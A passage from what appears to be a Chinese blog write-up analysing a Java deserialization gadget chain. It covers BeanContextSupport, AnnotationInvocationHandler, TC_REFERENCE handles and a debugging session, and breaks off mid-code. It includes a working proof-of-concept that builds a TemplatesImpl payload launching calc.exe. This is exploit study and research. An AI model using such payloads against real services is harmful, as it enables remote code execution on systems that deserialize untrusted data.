<p>直接写看个demo吧，这里我们会发现<code>里层try</code>会throw错误，但是这个时候并不会直接中断程序，相当于<code>里层try/catch</code>都属于<code>外层try的代码</code>，所以这时应该跳转到<code>外层的catch</code>，而<code>外层catch没有throw</code>时<code>后面的代码</code>依然可以<code>正常</code>运行</p>
<p>当然这里外层catch是throw的话，这个会返回<code>bitch2</code></p>
<p>还有一点外层catch的捕获类型要包含内层的throw，如果外层是IOException，内层是Exception，这时就会捕获不到，然后报错终端</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">error</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">1</span><span class="o">/</span><span class="n">0</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Exception</span><span class="p">(</span><span class="s">&#34;bitch&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        }catch (IOException e){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//            throw new Exception(&#34;bitch2&#34;);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;fuck&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>而<code>AnnotationInvocationHandler#readObject</code>中是先就执行了<code>s.defaultReadObject();</code>再对<code>type</code>进行的判断</p>
<p>这样也就是，进行type判断后的代码，我其实并不需要（gadget不用后面的调用），我只需要<code>AnnotationInvocationHandler对象</code>而已，所以这里靠<code>双层try/catch</code>能让<code>AnnotationInvocationHandler还原对象</code>即可，type后面的代码执行不了也无所谓</p>
<p><img loading="lazy" src="images/image-20250509204039608.png" alt="image-20250509204039608"  />
</p>
<p>所以gadget中如果有代码能满足这个一个例子，是不是就能让AnnotationInvocationHandler#readObject不中断程序了呢</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">try</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">os</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w"> </span><span class="c1">//这个进行AnnotationInvocationHandler#readObject</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">;</span><span class="w">            </span><span class="c1">//然后会跳转到这行来，只要不是什么强制退出的代码是不是就能用了呢</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>然后还有一点要考虑，就是段代码要能被我们<code>gadget调用</code>且能<code>控制os值</code>为我们AnnotationInvocationHandler序列化数据</p>
<p>这里<code>java.beans.beancontext.BeanContextSupport</code> 就刚好满足我们的条件，这个类的 <code>readObject()</code> ，调用了 <code>readChildren(ois);</code>下图其代码中可以看到catch是满足条件的</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span><span class="w"> </span><span class="kd">synchronized</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">readObject</span><span class="p">(</span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">synchronized</span><span class="p">(</span><span class="n">BeanContext</span><span class="p">.</span><span class="na">globalHierarchyLock</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">defaultReadObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">initialize</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">bcsPreDeserializationHook</span><span class="p">(</span><span class="n">ois</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">serializable</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">getBeanContextPeer</span><span class="p">()))</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">readChildren</span><span class="p">(</span><span class="n">ois</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">deserialize</span><span class="p">(</span><span class="n">ois</span><span class="p">,</span><span class="w"> </span><span class="n">bcmListeners</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ArrayList</span><span class="p">(</span><span class="n">1</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p><img loading="lazy" src="images/image-20250509211351382.png" alt="image-20250509211351382"  />
</p>
<h3 id="tc_reference">TC_REFERENCE<a hidden class="anchor" aria-hidden="true" href="#tc_reference">#</a></h3>
<p>这个简单说就是，java序列化/反序列化对每个对象产生时都设置了一个<code>Handler值</code>(类似索引)，而你第二次调用<code>同一个对象</code>时，java会直接通过这个<code>Handler值</code>找到第一次生成的对象进行调用</p>
<p>还是通过demo说下吧（这个特性绕过fastjson原生链那个是同一个）懒，demo也是直接copy的，别喷</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.Serializer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.File</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Test</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Fuck</span><span class="w"> </span><span class="n">f</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Fuck</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="o">[]</span><span class="w"> </span><span class="n">l</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="n">f</span><span class="p">,</span><span class="n">f</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">ser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Serializer</span><span class="p">.</span><span class="na">serialize</span><span class="p">(</span><span class="n">l</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">writeFile</span><span class="p">(</span><span class="n">ser</span><span class="p">,</span><span class="s">&#34;1.txt&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">writeFile</span><span class="p">(</span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">content</span><span class="p">,</span><span class="n">String</span><span class="w"> </span><span class="n">path</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">File</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">File</span><span class="p">(</span><span class="n">path</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileOutputStream</span><span class="w"> </span><span class="n">f</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="n">file</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">f</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">content</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">f</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>就这里不是有2个f么，都调用的同一个对象，这里序列化时，只会给第一个f完整的序列化，而第二个f则存储第一个f的<code>Handler</code>，而反序列化时，也是先反序列化第一个f，到第二个f还原对象时，直接把第一个f的对象给他</p>
<blockquote>
<p>关于<code>Handler</code>的一个小知识，<code>序列化数据</code>里面 <code>第一个Handler</code>值都是 <code>@Handler - 8257536 (0x7E0000)</code>，然后每新产生一个Handler，值+1，第二个Handler就为8257537</p>
</blockquote>
<h3 id="利用思路">利用思路<a hidden class="anchor" aria-hidden="true" href="#利用思路">#</a></h3>
<p>然后说了这么多到底怎么利用呢？</p>
<p>还记得7u21我们用的<code>LinkedHashSet</code>传了一个值，后面hash碰撞</p>
<ol>
<li>我们让<code>BeanContextSupport</code>包裹<code>AnnotationInvocationHandler</code>然后放在第一位//用于还原<code>AnnotationInvocationHandler对象</code></li>
<li>TemplatesImpl放第二位，和7u21一样用于hash的碰撞</li>
<li>Proxy放第三位，其中<code>代理类</code>和我们<code>BeanContextSupport</code>包裹的是同一个对象就行了</li>
</ol>
<p>这样会先反序列化<code>BeanContextSupport</code>对象，就会把<code>AnnotationInvocationHandler</code>还原了。然后<code>proxy利用时</code>直接通过<code>Handler</code>调用<code>还原了的AnnotationInvocationHandler对象</code>（后面就和7u21一样了</p>
<h3 id="poc-报错">poc 报错<a hidden class="anchor" aria-hidden="true" href="#poc-报错">#</a></h3>
<blockquote>
<p>前言：跳跳糖那篇文章很好，但是关于<code>最后那个报错</code>问题我觉得光看那篇文章肯定是搞不明白的以及为什么删那两个数据，为什么不能添加呢？为什么删除了数据会不出乱子而可以正常利用呢？其实都没交代（<strong>至少在我的视角</strong>下是这样的，也可能是我菜!^!），然后笔者下面记录的光看肯定也是理解不了，要自己找到对应点调试和对应序列化数据才能体会其中的真意</p>
</blockquote>
<p>直接copy的<a href="https://tttang.com/archive/1729/#toc_poc1">poc</a>，然后也很好理解吧，但是又产生了一个新的报错！！！（为了搞明白这个报错也是花费了一些时间）</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.Deserializer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.Serializer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.payloads.util.Gadgets</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.payloads.util.Reflections</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.transform.Templates</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.beans.beancontext.BeanContextSupport</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.InvocationHandler</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.LinkedHashSet</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Poc</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TemplatesImpl</span><span class="w"> </span><span class="n">templates</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">TemplatesImpl</span><span class="p">)</span><span class="w"> </span><span class="n">Gadgets</span><span class="p">.</span><span class="na">createTemplatesImpl</span><span class="p">(</span><span class="s">&#34;calc.exe&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvocationHandler</span><span class="w"> </span><span class="n">ih</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">InvocationHandler</span><span class="p">)</span><span class="w"> </span><span class="n">Reflections</span><span class="p">.</span><span class="na">getFirstCtor</span><span class="p">(</span><span class="n">Gadgets</span><span class="p">.</span><span class="na">ANN_INV_HANDLER_CLASS</span><span class="p">).</span><span class="na">newInstance</span><span class="p">(</span><span class="n">Override</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;&gt;</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Reflections</span><span class="p">.</span><span class="na">setFieldValue</span><span class="p">(</span><span class="n">ih</span><span class="p">,</span><span class="s">&#34;type&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">Templates</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Templates</span><span class="w"> </span><span class="n">proxy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Gadgets</span><span class="p">.</span><span class="na">createProxy</span><span class="p">(</span><span class="n">ih</span><span class="p">,</span><span class="n">Templates</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">BeanContextSupport</span><span class="w"> </span><span class="n">b</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">BeanContextSupport</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Reflections</span><span class="p">.</span><span class="na">setFieldValue</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="s">&#34;serializable&#34;</span><span class="p">,</span><span class="n">1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashMap</span><span class="w"> </span><span class="n">tmpMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">tmpMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">ih</span><span class="p">,</span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Reflections</span><span class="p">.</span><span class="na">setFieldValue</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="s">&#34;children&#34;</span><span class="p">,</span><span class="n">tmpMap</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">LinkedHashSet</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">LinkedHashSet</span><span class="p">();</span><span class="c1">//这样可以确保先反序列化 templates 再反序列化 proxy</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">set</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">b</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">set</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">templates</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">set</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">proxy</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashMap</span><span class="w"> </span><span class="n">hm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">hm</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;f5a5a608&#34;</span><span class="p">,</span><span class="n">templates</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Reflections</span><span class="p">.</span><span class="na">setFieldValue</span><span class="p">(</span><span class="n">ih</span><span class="p">,</span><span class="s">&#34;memberValues&#34;</span><span class="p">,</span><span class="n">hm</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">ser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Serializer</span><span class="p">.</span><span class="na">serialize</span><span class="p">(</span><span class="n">set</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Deserializer</span><span class="p">.</span><span class="na">deserialize</span><span class="p">(</span><span class="n">ser</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>然后运行会产生一个因为<code>readInt()</code>的报错，而这个报错归功于<code>AnnotationInvocationHandler</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Exception</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">thread</span><span class="w"> </span><span class="s">&#34;main&#34;</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">EOFException</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="n">at</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">DataInputStream</span><span class="p">.</span><span class="na">readInt</span><span class="p">(</span><span class="n">DataInputStream</span><span class="p">.</span><span class="na">java</span><span class="p">:</span><span class="n">392</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="n">at</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">ObjectInputStream$BlockDataInputStream</span><span class="p">.</span><span class="na">readInt</span><span class="p">(</span><span class="n">ObjectInputStream</span><span class="p">.</span><span class="na">java</span><span class="p">:</span><span class="n">2823</span><span class="p">)</span><span class="w">
</span></span></span></code></pre></div><p>一直调试跟踪到<code>readBlockHeader()</code>这里<code>return -1;</code>导致的in.read()为-1 ，然后进入throw</p>
<p><img loading="lazy" src="images/image-20250510152758057.png" alt="image-20250510152758057"  />
</p>
<p><img loading="lazy" src="images/image-20250510152928328.png" alt="image-20250510152928328"  />
</p>
<p>跟踪发现你的类重写readObject然后调用<code>defaultReadObject()</code>，反序列化就会进入下方代码，而<code>defaultDataEnd</code>这个值则跟该类有没有<code>writeObject()</code>有关，没有的话这里就会给<code>defaultDataEnd = true</code>，然后这就是导致上方报错的根本原因吗？？？No</p>
<p><img loading="lazy" src="images/image-20250510154056878.png" alt="image-20250510154056878"  />
</p>
<p>其实这只是其中一个原因（或者说不是根本原因），如果<code>BeanContextSupport</code>存一个对象，就因为这个对象的类没有<code>writeObject()</code>就报错，是不是有点太蠢了呀。于是写了个demo</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.Deserializer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.Serializer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.payloads.util.ReadWrite</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.payloads.util.Reflections</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.beans.beancontext.BeanContextSupport</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.LinkedHashSet</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">serSupport</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Test2</span><span class="w"> </span><span class="n">test</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Test2</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">BeanContextSupport</span><span class="w"> </span><span class="n">b</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">BeanContextSupport</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Reflections</span><span class="p">.</span><span class="na">setFieldValue</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="s">&#34;serializable&#34;</span><span class="p">,</span><span class="n">1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashMap</span><span class="w"> </span><span class="n">tmpMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">tmpMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">test</span><span class="p">,</span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Reflections</span><span class="p">.</span><span class="na">setFieldValue</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="s">&#34;children&#34;</span><span class="p">,</span><span class="n">tmpMap</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">test2</span><span class="o">=</span><span class="s">&#34;test2&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TemplatesImpl</span><span class="w"> </span><span class="n">templates</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">LinkedHashSet</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">LinkedHashSet</span><span class="p">();</span><span class="c1">//这样可以确保先反序列化 templates 再反序列化 proxy</span><span class="w">
